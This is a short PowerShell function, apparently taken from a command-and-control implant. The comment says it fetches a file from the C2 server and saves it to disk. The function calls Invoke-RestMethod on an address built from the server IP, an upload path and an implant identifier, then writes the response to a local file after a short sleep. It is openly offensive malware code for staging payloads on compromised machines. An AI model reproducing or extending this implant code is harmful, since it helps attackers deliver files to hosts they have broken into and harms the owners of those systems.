# upload - gets a file from the C2 server and saves to disk
function func_upload 
{
    param([string] $file_path) # the uri to get from, and the place to save to

    Start-Sleep -Seconds 2

    if($file_path.Length -lt 1)
    {
        $file_path = "upload"
    }
    
    Invoke-RestMethod -Uri "$protocol//$ip/$upload_uri/$implant_id" -OutFile $file_path
}